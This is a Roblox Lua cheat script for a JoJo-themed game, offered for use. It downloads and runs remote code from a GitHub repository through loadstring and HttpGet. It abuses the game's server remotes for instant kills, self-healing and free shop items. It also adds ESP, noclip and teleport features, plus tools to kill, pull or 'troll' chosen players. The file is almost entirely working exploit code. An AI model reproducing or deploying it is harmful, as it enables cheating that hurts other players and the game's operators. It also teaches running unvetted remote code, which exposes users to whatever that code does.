
-------------key
getgenv().version = "1.0.3"  
-----------------key
--------------------------------------WHITELIST SYS

local success, hostStatus = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/bank124/Axis-Hub/main/check"))()
end)












if success and hostStatus then -------------------------------- as you see it check if key success
    print("Whitelist fetched successfully!")
    for _, v in pairs(hostStatus) do
        print("Script Is Up Enjoy!")  
    end

    local keyMatched = false
    for _, v in pairs(hostStatus) do
        if getgenv().version == v then
            keyMatched = true
            break
        end
    end

    if keyMatched then

print("version: 1.0.4")


---------------------script
---------------------------------GUI
local vu = game:GetService("VirtualUser")
    
    game:GetService("Players").LocalPlayer.Idled:connect(function()
    
    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    
    wait(30)
    
    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    
    end)


   
    setfpscap(999)




    spawn(function()
        while task.wait() do
            pcall(function()
                if _G.ESPNPC then
                    for i,v in pairs(game.Workspace:GetChildren()) do
                        if v:IsA("Model") and v.Name == "Caesar" or v.Name == "Gyro" or v.Name == "Zeppeli" then
                            if v:FindFirstChild("Handle") then
                                if not v.Handle:FindFirstChild("ESP") then
                                    local BillboardGui = Instance.new("BillboardGui")
                                    local TextLabel = Instance.new("TextLabel")
                                    BillboardGui.Parent = v.Handle
                                    BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                                    BillboardGui.Active = true
                                    BillboardGui.Name = "ESP"
                                    BillboardGui.AlwaysOnTop = true
                                    BillboardGui.LightInfluence = 1.000
                                    BillboardGui.Size = UDim2.new(0, 200, 0, 50)
                                    BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0)
    
                                    TextLabel.Parent = BillboardGui
                                    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                                    TextLabel.BackgroundTransparency = 1.000
                                    TextLabel.Size = UDim2.new(0, 200, 0, 50)
                                    TextLabel.Font = Enum.Font.GothamBold
                                    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                                    TextLabel.TextSize = 15
                                    TextLabel.TextStrokeTransparency = 0.000
                                    TextLabel.TextWrapped = true
                                end
                                local Dis = math.floor((game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Handle.Position).Magnitude)
                                v.Handle.ESP.TextLabel.Text = v.Name.."\n"..Dis.." m."
                            end
                        end
                    end
                else
                    for i,v in pairs(game.Workspace:GetChildren()) do
                        if v:IsA("Tool") then
                            if v:FindFirstChild("Handle") then
                                if v.Handle:FindFirstChild("ESP") then
                                    v.Handle.ESP:Destroy()
                                end
                            end
                        end
                    end
                end
            end)
        end
    end)




    spawn(function()
        while task.wait() do
            pcall(function()
                if _G.ESP then
                    for i,v in pairs(game.Workspace:GetChildren()) do
                        if v:IsA("Tool") or v.Name == "RequiemArrow" or v.Name == "RokakakaFruit" or v.Name == "AjaMask" or v.Name == "StoneRokakakaFruit" or v.Name == "RedAja" or v.Name == "VampireMask" or v.Name == "Dio's Bone" or v.Name == "Dio's Diary" or v.Name == "Right Eye" or v.Name == "Spine" then
                            if v:FindFirstChild("Handle") then
                                if not v.Handle:FindFirstChild("ESP") then
                                    local BillboardGui = Instance.new("BillboardGui")
                                    local TextLabel = Instance.new("TextLabel")
                                    BillboardGui.Parent = v.Handle
                                    BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                                    BillboardGui.Active = true
                                    BillboardGui.Name = "ESP"
                                    BillboardGui.AlwaysOnTop = true
                                    BillboardGui.LightInfluence = 1.000
                                    BillboardGui.Size = UDim2.new(0, 200, 0, 50)
                                    BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0)
    
                                    TextLabel.Parent = BillboardGui
                                    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                                    TextLabel.BackgroundTransparency = 1.000
                                    TextLabel.Size = UDim2.new(0, 200, 0, 50)
                                    TextLabel.Font = Enum.Font.GothamBold
                                    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                                    TextLabel.TextSize = 15
                                    TextLabel.TextStrokeTransparency = 0.000
                                    TextLabel.TextWrapped = true
                                end
                                local Dis = math.floor((game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Handle.Position).Magnitude)
                                v.Handle.ESP.TextLabel.Text = v.Name.."\n"..Dis.." m."
                            end
                        end
                    end
                else
                    for i,v in pairs(game.Workspace:GetChildren()) do
                        if v:IsA("Tool") then
                            if v:FindFirstChild("Handle") then
                                if v.Handle:FindFirstChild("ESP") then
                                    v.Handle.ESP:Destroy()
                                end
                            end
                        end
                    end
                end
            end)
        end
    end)













    local player = game.Players.LocalPlayer
    local interactedItems = {}
    
    local function CollectTool(specificToolName)
        for _, tool in pairs(game:GetService("Workspace"):GetChildren()) do
            if tool:IsA("Tool") and tool.Name == specificToolName then
                local handle = tool:FindFirstChild("Handle")
                if handle and handle:IsA("BasePart") then
                    local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                    if humanoidRootPart then
                     handle.CFrame = humanoidRootPart.CFrame
                        task.wait(0)
                        return true
                    end
                end
            end
        end
        return false
    end
    
    local function CollectAllTools()
        local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart then
            return false
        end
    
        local foundAny = false
        for _, tool in pairs(game.Workspace:GetChildren()) do
            if tool:IsA("Tool") then
                local handle = tool:FindFirstChild("Handle")
                if handle and handle:IsA("BasePart") then
                   handle.CFrame = humanoidRootPart.CFrame
                    task.wait(0)
                    foundAny = true
                end
            end
        end
        return foundAny
    end
    
    local function createSafeBase()
        local basePart = Instance.new("Part")
        basePart.Size = Vector3.new(10, 1, 10)
        basePart.CFrame = CFrame.new(10000, 50000, 80000)
        basePart.Anchored = true
        basePart.Name = "SafeBase"
        basePart.Parent = workspace
        return basePart
    end
    
    local safeBase = createSafeBase()
    
    local function teleportToSafeBase()
        local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.CFrame = safeBase.CFrame * CFrame.new(0, 3, 0)
        end
    end
    
    spawn(function()
        while task.wait() do
            pcall(function()
                if _G.Enabled then
                    repeat
                        local foundTool = false
    
                        if _G.AutoDioBone then
                            foundTool = CollectTool("Dio's Bone") or foundTool
                        end
                        
                        if _G.AutoRedAja then
                            foundTool = CollectTool("RedAja") or foundTool
                        end
                        
                        if _G.AutoRequiemArrow then
                            foundTool = CollectTool("RequiemArrow") or foundTool
                        end
    
                        if _G.AutoRightEye then
                            foundTool = CollectTool("Right Eye") or foundTool
                        end
    
                        if _G.AutoRokaka then
                            foundTool = CollectTool("RokakakaFruit") or foundTool
                        end
    
                        if _G.AutoStoneRokakaka then
                            foundTool = CollectTool("StoneRokakakaFruit") or foundTool
                        end
    
                        if _G.AutoStandArrow then
                            foundTool = CollectTool("StandArrow") or foundTool
                        end
    
                        if _G.AutoAjaMask then
                            foundTool = CollectTool("AjaMask") or foundTool
                        end
    
                        if _G.AutoDioDiary then
                            foundTool = CollectTool("Dio's Diary") or foundTool
                        end

                        if _G.AutoSpine then
                            foundTool = CollectTool("Spine") or foundTool
                        end
    
                        if _G.AutoVamp then
                            foundTool = CollectTool("VampireMask") or foundTool
                        end
    
                        if _G.AutoCollectAll then
                            foundTool = CollectAllTools() or foundTool
                        end
    
                       
                        if not foundTool then
                            teleportToSafeBase()
                        end
    
                        wait(0.00000000000001)
    
                    until not _G.Enabled
                end
            end)
        end
    end)
    


    
    
    
    

spawn(function()
    while task.wait() do
        pcall(function()
if _G.Worth then
repeat
wait(0.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").DioBone.CFrame * CFrame.new(0,0,0)

wait(0.5) do
fireclickdetector(game:GetService("Workspace").DioBone.ClickDetector)
end
until not _G.Worth or not game:GetService("Workspace").DioBone
end
end)
end
end)

spawn(function()
    while task.wait() do
        pcall(function()
if _G.Worth then
repeat
wait(0.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").DioDiary.Handle.CFrame * CFrame.new(0,0,0)

wait(0.5) do
fireclickdetector(game:GetService("Workspace").DioDiary.Handle.ClickDetector)
end
until not _G.Worth or not game:GetService("Workspace").DioDiary
end
end)
end
end)



spawn(function()
    while task.wait() do
        pcall(function()
            if _G.NTR then
            repeat
local args = {
[1] = 55,
[2] = game:GetService("Players").LocalPlayer.Character["Right Arm"],
[3] = CFrame.new(0,0,0),
[4] = 99999999999,
[5] = game:GetService("Players").LocalPlayer.Character.Torso.voiceline,
[6] = workspace["Notorious B.I.G"].Humanoid
}

game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
wait(.001)
until not _G.NTR

                   end
                   end)
                   end
                   end)





spawn(function()
    while task.wait() do
        pcall(function()
            if _G.Dio then
            repeat
local args = {
[1] = 55,
[2] = game:GetService("Players").LocalPlayer.Character["Right Arm"],
[3] = CFrame.new(0,0,0),
[4] = 1,
[5] = game:GetService("Players").LocalPlayer.Character.Torso.voiceline,
[6] = workspace.DIO.Humanoid
}

game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
wait(.001)
until not _G.Dio

                   end
                   end)
                   end
                   end)


                   spawn(function()
                    while task.wait() do
                        pcall(function()
                            if _G.Kira then
                            repeat
            local args = {
                [1] = 55,
                [2] = game:GetService("Players").LocalPlayer.Character["Right Arm"],
                [3] = CFrame.new(0,0,0),
                [4] = 1,
                [5] = game:GetService("Players").LocalPlayer.Character.Torso.voiceline,
                [6] = workspace.Kira.Humanoid
            }
            
            game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
            game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
            game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
            game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
            game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
            game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
            game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
            game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
            game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
            game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
            game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
            game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
             wait(.001)
            until not _G.Kira
        
                                   end
                                   end)
                                   end
                                   end)




spawn(function()
    while task.wait() do
        pcall(function()
            if _G.Diavolo then
            repeat
local args = {
[1] = 55,
[2] = game:GetService("Players").LocalPlayer.Character["Right Arm"],
[3] = CFrame.new(0,0,0),
[4] = 9999999,
[5] = game:GetService("Players").LocalPlayer.Character.Torso.voiceline,
[6] = workspace.Diavolo.Humanoid
}

game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
wait(.00000000000000000000001)
until not _G.Diavolo
              
                   end
                   end)
                   end
                   end)















spawn(function()
    while game:GetService("RunService").Stepped:wait() do
        pcall(function()
            if _G.Noclip then
                local character = game.Players.LocalPlayer.Character
                for _, v in pairs(character:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.CanCollide = false
                    end
                end
            end
        end)
    end
end)


local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/bank124/Axis-Hub/main/rayfieldgui"))()
local Window = Rayfield:CreateWindow({
    Name = "Axis Hub X 1XBET : ProJect Jojo",
    LoadingTitle = "Version: 1.0.4",
    LoadingSubtitle = "by 1XBET",
    
 })

 local Main = Window:CreateTab("Main", 4370033185) 
 local Item = Window:CreateTab("Item Collect", 4370033185) 
 local Player = Window:CreateTab("Player", 4370033185)
 local Shop = Window:CreateTab("Shop", 4370033185)
 local Misc = Window:CreateTab("Misc", 4370033185) 
 local setting = Window:CreateTab("Theme", 4370033185) 






 local dummyNames1 = { 
    "Wood Dummy",
    "Evil Stone Free User",
    "Metal Dummy",
    "Ice Dummy",
    "Titan Dummy",
    "Rock Dummy",
    "Giant Dummy",
    "Hyperspace Dummy"
}

local dummyNames2 = { 
    "Holy Dummy",
    "Evil Star Platinum User",
    "Space Dummy"
}

spawn(function()
    while task.wait() do
        pcall(function()
            if _G.Kill then
                for _, dummy in ipairs(workspace:GetChildren()) do
                    if table.find(dummyNames1, dummy.Name) and dummy:FindFirstChild("Humanoid") then
                        local args = {
                            [1] = 55,
                            [2] = game.Players.LocalPlayer.Character["Right Arm"],
                            [3] = CFrame.new(0, 0, 0),
                            [4] = 99999999999,
                            [5] = game.Players.LocalPlayer.Character.Torso.voiceline,
                            [6] = dummy.Humanoid
                        }
                        game.ReplicatedStorage.Logic.hitbox:InvokeServer(unpack(args))
                    end
                end
            end
        end)
    end
end)

spawn(function()
    while task.wait() do
        pcall(function()
            if _G.Kill2 then
                for _, dummy in ipairs(workspace:GetChildren()) do
                    if table.find(dummyNames2, dummy.Name) and dummy:FindFirstChild("Humanoid") then
                        local args = {
                            [1] = 55,
                            [2] = game.Players.LocalPlayer.Character["Right Arm"],
                            [3] = CFrame.new(0, 0, 0),
                            [4] = 99999999999,
                            [5] = game.Players.LocalPlayer.Character.Torso.voiceline,
                            [6] = dummy.Humanoid
                        }
                        game.ReplicatedStorage.Logic.hitbox:InvokeServer(unpack(args))
                    end
                end
            end
        end)
    end
end)






local Toggle = Main:CreateToggle({
    Name = "Auto Kill Dummy",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
        if game.PlaceId == 2295122555 then
   _G.Kill = t
    elseif game.PlaceId == 2731332132 then
 _G.Kill2 = t
    end
  
    end,
})




 if game.PlaceId == 2731332132 then
 local Toggle = Main:CreateToggle({
    Name = "Auto Kill Diavolo",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
   _G.Diavolo = t
  
    end,
 })
end



if game.PlaceId == 2295122555 then
 local Toggle = Main:CreateToggle({
    Name = "Auto Kill Kira",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
   _G.Kira = t
  
    end,
 })


 local Toggle = Main:CreateToggle({
    Name = "Auto Kill Notorios B.I.G",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
   _G.NTR = t
  
    end,
 })


 local Toggle = Main:CreateToggle({
    Name = "Auto Kill Dio",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
   _G.Dio = t
  
    end,
 })
end


 local Toggle = Main:CreateToggle({
    Name = "Auto Worth",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
   _G.Worth = t
  
    end,
 })


 if game.PlaceId == 2295122555 then
 local Button = Main:CreateButton({
    Name = "Tp To Pucci",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1668.0960693359375, 877.4659423828125, -597.299560546875)
    end,
 })
end


if game.PlaceId == 2731332132 then
    local Button = Main:CreateButton({
       Name = "Tp To Pucci",
       Callback = function()
           game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-353.7167053222656, 104, -247.41482543945312)
       end,
    })
   end

















 local Toggle = Item:CreateToggle({
    Name = "Enable Collect Item",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
   _G.Enabled = t
   _G.Noclip = t
 

    end,
 })

 if game.PlaceId == 2295122555 then
 local Button = Item:CreateButton({
    Name = "Tp To Shop",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1518.31494140625, 875.027099609375, -423.003662109375)
    end,
 })
end


 local Section = Item:CreateSection("Option")




 local Toggle = Item:CreateToggle({
    Name = "Auto Collect All Item",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
   _G.AutoCollectAll = t
  
    end,
 })



 if game.PlaceId == 2295122555 then
 local Toggle = Item:CreateToggle({
    Name = "Auto Collect Rokakaka Fruit",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
 _G.AutoRokaka = t
 

  end,
})
end

if game.PlaceId == 2295122555 then
local Toggle = Item:CreateToggle({
    Name = "Auto Collect Dio Diary",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
 _G.AutoDioDiary = t
 

  end,
})
end

 local Toggle = Item:CreateToggle({
    Name = "Auto Collect Requiem Arrow",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
   _G.AutoRequiemArrow = t
  
    end,
 })



 if game.PlaceId == 2295122555 then
 local Toggle = Item:CreateToggle({
    Name = "Auto Collect Dio Bone",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
 _G.AutoDioBone = t

end,
})
end



if game.PlaceId == 2731332132 then
local Toggle = Item:CreateToggle({
    Name = "Auto Collect Right Eye",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
 _G.AutoRightEye = t
 
end,
})
local Toggle = Item:CreateToggle({
    Name = "Auto Collect Spine",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
 _G.AutoSpine = t
 
end,
})
end


if game.PlaceId == 2295122555 then
local Toggle = Item:CreateToggle({
    Name = "Auto Collect Stone Rokakaka",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
 _G.AutoStoneRokakaka = t
 

end,
})
end

if game.PlaceId == 2295122555 then
local Toggle = Item:CreateToggle({
    Name = "Auto Collect Stand Arrow",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
 _G.AutoStandArrow = t
 

end,
})
end

if game.PlaceId == 2731332132 then
local Toggle = Item:CreateToggle({
    Name = "Auto Collect Aja Mask",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
 _G.AutoAjaMask = t
 

end,
})
end


 local Toggle = Item:CreateToggle({
    Name = "Auto Collect RedAja",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
 _G.AutoRedAja = t
 

end,
})












local players = {}


local function updatePlayers()
    players = {} 
    for _, player in pairs(game.Players:GetPlayers()) do
        table.insert(players, player.Name)
        print("Refreshing...")
    end
end


updatePlayers()

local targetPlayerName = ""  
local targetPlayerObject = nil  

local Dropdown = Player:CreateDropdown({
    Name = "Select Players",
    Options = players,
    CurrentOption = {},  
    MultipleOptions = false,
    Flag = "PlayerDropdown",
    Callback = function(selectedName)
        if typeof(selectedName) == "string" then
            targetPlayerName = selectedName
        elseif typeof(selectedName) == "table" and #selectedName > 0 then
            targetPlayerName = selectedName[1]
        else
            targetPlayerName = ""
        end

        targetPlayerObject = game.Players:FindFirstChild(targetPlayerName)
        print("Selected player: ", targetPlayerObject and targetPlayerObject.Name or "None")




    end,
})

game.Players.PlayerAdded:Connect(function()
    updatePlayers()
    pcall(function()
        Dropdown:Refresh(players)
    end)
end)

game.Players.PlayerRemoving:Connect(function()
    updatePlayers()
    pcall(function()
        Dropdown:Refresh(players)
    end)
end)


local Button = Player:CreateButton({
    Name = "Refresh List",
    CurrentValue = false,
    Flag = "Item",
    Callback = function()
        updatePlayers()
        pcall(function()
            Dropdown:Refresh(players)  
        end)
        print("Player list refreshed!")
    end,
})




local player = game.Players.LocalPlayer
local _G = _G or {}


local function startGiveGodLoop()
    spawn(function()
        while task.wait(0.1) do
            if _G.GiveGod and targetPlayerObject then
                print("Executing Give God Mode on", targetPlayerObject.Name) 
                local character = player.Character
                if character and targetPlayerObject.Character then
                    local rightArm = character:FindFirstChild("Right Arm")
                    local torso = character:FindFirstChild("Torso")
                    local targetHumanoid = targetPlayerObject.Character:FindFirstChild("Humanoid")
                    if rightArm and torso and targetHumanoid then
                        local args = {
                            [1] = 8,
                            [2] = rightArm,
                            [3] = CFrame.new(1e15, 1e15, 1e15) * CFrame.Angles(1.485, 0.162, -0.527),
                            [4] = 1e100,  
                            [5] = torso:FindFirstChild("voiceline"),
                            [6] = targetHumanoid,
                            [7] = false,
                            [9] = false,
                            [10] = false
                        }
                        game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
                    else
                        print("Error: Missing character parts for Give God Mode")
                    end
                else
                    print("Error: Missing target character")
                end
            end
        end
    end)
end


local function startBuffLoop()
    spawn(function()
        while task.wait(0.5) do
            if _G.Buff and targetPlayerObject then
                print("Applying Buff to", targetPlayerObject.Name)
                local character = player.Character
                if character and targetPlayerObject.Character then
                    local torso = character:FindFirstChild("Torso")
                    local targetHumanoid = targetPlayerObject.Character:FindFirstChild("Humanoid")
                    if torso and targetHumanoid then
                        local args = {
                            [1] = CFrame.new(1798.1, 875.0, -756.9) * CFrame.Angles(3.14, -0.07, 1.57),
                            [2] = torso,
                            [3] = targetHumanoid,
                            [4] = CFrame.new(1797.9, 875.3, -755.7) * CFrame.Angles(2.96, 0.72, -3.0),
                            [5] = CFrame.new(1795.6, 875.3, -757.6) * CFrame.Angles(2.58, 0.6, -2.76)
                        }
                        game:GetService("ReplicatedStorage").Specials.esticker:FireServer(unpack(args))
                        game:GetService("ReplicatedStorage").Specials.esticker:FireServer(unpack(args))
                        game:GetService("ReplicatedStorage").Specials.esticker:FireServer(unpack(args))
                        game:GetService("ReplicatedStorage").Specials.esticker:FireServer(unpack(args))
                        game:GetService("ReplicatedStorage").Specials.esticker:FireServer(unpack(args))
                        wait(3)
                    else
                        print("Error: Missing character parts for Buff")
                    end
                end
            end
        end
    end)
end


local function startKillLoop()
    spawn(function()
        while task.wait() do
            pcall(function()
                if _G.Killed then
                    repeat
                        wait(0.1)
                        if targetPlayerObject and targetPlayerObject.Character then
                            local args = {
                                [1] = 55,
                                [2] = player.Character:FindFirstChild("Right Arm"),
                                [3] = CFrame.new(1293.1, 875.4, -422.7) * CFrame.Angles(1.72, 0.03, 1.89),
                                [4] = 1,
                                [5] = player.Character.Torso.voiceline,
                                [6] = targetPlayerObject.Character.Humanoid,
                                [7] = false,
                                [9] = false,
                                [10] = false
                            }
                            game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
                        else
                            print("Target player not found for kill action.")
                        end
                       
                    until not _G.Killed
                end
            end)
        end
    end)
end

local function startBurnLoop()
    spawn(function()
        while task.wait(0.5) do
            if _G.Burn and targetPlayerObject then
                print("Trolling/Burn effect on", targetPlayerObject.Name)
                local character = player.Character
                if character and targetPlayerObject.Character then
                    local rightArm = character:FindFirstChild("Right Arm")
                    local torso = character:FindFirstChild("Torso")
                    local targetHumanoid = targetPlayerObject.Character:FindFirstChild("Humanoid")
                    if rightArm and torso and targetHumanoid then
                        local args = {
                            [1] = 97,
                            [2] = rightArm,
                            [3] = CFrame.new(1e15, 1e15, 1e15) * CFrame.Angles(1.48, 0.16, -0.53),
                            [4] = -0,
                            [5] = torso:FindFirstChild("voiceline"),
                            [6] = targetHumanoid,
                            [7] = false,
                            [9] = false,
                            [10] = false
                        }
                        game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
                    else
                        print("Error: Missing character parts for Trolling/Burn")
                    end
                end
            end
        end
    end)
end













player.CharacterAdded:Connect(function()
    startGiveGodLoop()
    startBuffLoop()
    startBurnLoop()
    startKillLoop()
end)


if player.Character then
    startGiveGodLoop()
    startBuffLoop()
    startBurnLoop()
    startKillLoop()
end







local Toggle = Player:CreateToggle({
    Name = "Spectate",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
        Sp = t
        if targetPlayerObject and targetPlayerObject.Character then
            local plr2 = targetPlayerObject.Character.Humanoid
            repeat wait(.1)
                game.Workspace.Camera.CameraSubject = plr2
            until Sp == false
            game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
        else
            print("Target player not found for spectating.")
        end
    end,
})




local Button = Player:CreateButton({
    Name = "Teleport To Selected Player",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
        if targetPlayerObject and targetPlayerObject.Character then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayerObject.Character.HumanoidRootPart.CFrame
        else
            print("Target player not found for teleportation.")
        end
    end,
})




local Toggle = Player:CreateToggle({
    Name = "Give God Mode",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
        _G.GiveGod = t
        print("Give God Mode toggled: ", t)
    end,
})

local Toggle = Player:CreateToggle({
    Name = "Give Buff",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
        _G.Buff = t
        print("Buff toggled: ", t)
    end,
})


local Toggle = Player:CreateToggle({
    Name = "Trolling",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
        _G.Burn = t
        print("Trolling toggled: ", t)
    end,
})


local Button = Player:CreateButton({
    Name = "Bring",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
        if targetPlayerObject and targetPlayerObject.Character then
            local args = {
                [1] = 24,
                [2] = player.Character:FindFirstChild("Right Arm"),
                [3] = CFrame.new(1293.1, 875.4, -422.7) * CFrame.Angles(1.72, 0.03, 1.89),
                [4] = 0,
                [5] = player.Character.Torso.voiceline,
                [6] = targetPlayerObject.Character.Humanoid,
                [7] = false,
                [9] = false,
                [10] = false
            }
            game:GetService("ReplicatedStorage").Logic.hitbox:InvokeServer(unpack(args))
        else
            print("Target player not found for bringing action.")
        end
    end,
})












local Button = Player:CreateToggle({
    Name = "Kill",
    CurrentValue = false,
    Flag = "Item",
    Callback = function(t)
        _G.Killed = t
    end,
})



local player = game.Players.LocalPlayer

local function startGodLoop()
    spawn(function()
        while task.wait() do
            pcall(function()
                if _G.God then
                    repeat
                        wait(0.1)
                        local character = player.Character
                        if character then
                            local torso = character:FindFirstChild("Torso")
                            local humanoid = character:FindFirstChild("Humanoid")

                            if torso and humanoid then
                                local args = {
                                    [1] = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, 0),
                                    [2] = math.huge,
                                    [3] = humanoid,
                                    [4] = torso:FindFirstChild("voiceline"),
                                    [5] = false
                                }

                                game:GetService("ReplicatedStorage").Specials.healevent:FireServer(unpack(args))
                            end
                        end
                    until not _G.God
                end
            end)
        end
    end)
end

player.CharacterAdded:Connect(startGodLoop)
if player.Character then
    startGodLoop()
end





spawn(function()
    while task.wait() do
    if _G.Void then
local args = {
    [1] = true
}

game:GetService("ReplicatedStorage").Specials.voiddimension:FireServer(unpack(args))
end
end
end)

spawn(function()
    while task.wait() do
    if not _G.Void then
local args = {
    [1] = false
}

game:GetService("ReplicatedStorage").Specials.voiddimension:FireServer(unpack(args))

end
end
end)



spawn(function()
    while task.wait() do
if _G.Kiss then
repeat
wait(2)
local args = {
    [1] = CFrame.new(1798.10595703125, 875.0091552734375, -756.9478149414062) * CFrame.Angles(3.1414377689361572, -0.07184621691703796, 1.570127248764038),
    [2] = game:GetService("Players").LocalPlayer.Character.Torso,
    [3] = game:GetService("Players").LocalPlayer.Character.Humanoid,
    [4] = CFrame.new(1797.93701171875, 875.272705078125, -755.6904907226562) * CFrame.Angles(2.9672560691833496, 0.7212512493133545, -3.001552104949951),
    [5] = CFrame.new(1795.6160888671875, 875.3175659179688, -757.587646484375) * CFrame.Angles(2.5792205333709717, 0.5995398163795471, -2.7618472576141357)
}

game:GetService("ReplicatedStorage").Specials.esticker:FireServer(unpack(args))
game:GetService("ReplicatedStorage").Specials.esticker:FireServer(unpack(args))
game:GetService("ReplicatedStorage").Specials.esticker:FireServer(unpack(args))
game:GetService("ReplicatedStorage").Specials.esticker:FireServer(unpack(args))
game:GetService("ReplicatedStorage").Specials.esticker:FireServer(unpack(args))
game:GetService("ReplicatedStorage").Specials.esticker:FireServer(unpack(args))
game:GetService("ReplicatedStorage").Specials.esticker:FireServer(unpack(args))

until not _G.Kiss
end
end
end)



local Button = Shop:CreateButton({
    Name = "Buy Rokakaka (500)",
    Callback = function()
        local args = {
            [1]="RokakakaFruit",
            
            }
            
            game:GetService("ReplicatedStorage").Logic.giveitem:FireServer(unpack(args))
    end,
 })


 local Button = Shop:CreateButton({
    Name = "Buy Stand Arrow (3,500)",
    Callback = function()
        local args = {
            [1]="StandArrow",
            
            }
            
            game:GetService("ReplicatedStorage").Logic.giveitem:FireServer(unpack(args))
    end,
 })


